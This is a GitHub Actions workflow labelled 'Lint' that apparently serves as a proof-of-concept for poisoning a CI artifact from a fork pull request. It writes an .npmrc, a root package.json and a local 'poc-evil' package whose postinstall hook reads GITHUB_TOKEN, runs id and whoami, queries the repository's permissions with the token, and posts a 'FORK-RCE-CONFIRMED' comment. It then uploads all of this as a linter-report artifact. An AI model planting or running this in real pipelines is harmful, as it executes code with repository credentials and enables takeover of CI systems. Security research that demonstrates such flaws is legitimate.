---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage attacker-controlled artifact payload
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          echo "$PR_NUMBER" > pr-number.txt
          echo "fork supplied linter report" > linter-report.txt
          printf 'allow-scripts=poc-evil\n' > .npmrc
          mkdir -p poc-evil
          cat > package.json <<'JSON'
          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
          JSON
          cat > poc-evil/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          cat > poc-evil/hook.js <<'JS'
          const fs = require('fs');
          const cp = require('child_process');
          (async () => {
            const out = {};
            try {
              const ws = process.env.GITHUB_WORKSPACE || process.cwd();
              const tok = process.env.GITHUB_TOKEN || '';
              const repo = process.env.GITHUB_REPOSITORY;
              const pr = fs.readFileSync(ws + '/pr-number.txt', 'utf8').trim();
              out.run = process.env.GITHUB_RUN_ID;
              out.pr = pr;
              out.event = process.env.GITHUB_EVENT_NAME;
              out.token_present = !!tok;
              out.token_len = tok.length;
              out.uid = cp.execSync('id -u').toString().trim();
              out.whoami = cp.execSync('whoami').toString().trim();
              const r = await fetch('https://api.github.com/repos/' + repo, { headers: { authorization: 'Bearer ' + tok, 'user-agent': 'poc' } });
              const j = await r.json();
              out.repo_status = r.status;
              out.perms = j.permissions;
              out.private = j.private;
              out.fork = j.fork;
              fs.writeFileSync(ws + '/fork-rce-proof.json', JSON.stringify(out));
              console.log('FORK-RCE-CANARY ' + JSON.stringify(out));
              const c = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
                method: 'POST',
                headers: { authorization: 'Bearer ' + tok, 'content-type': 'application/json', 'user-agent': 'poc' },
                body: JSON.stringify({ body: 'FORK-RCE-CONFIRMED ' + JSON.stringify(out) })
              });
              console.log('FORK-RCE-COMMENT-STATUS ' + c.status);
            } catch (e) {
              console.log('FORK-RCE-HOOK-ERR ' + e.message);
            }
          })();
          JS
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            pr-number.txt
            linter-report.txt
            .npmrc
            package.json
            poc-evil
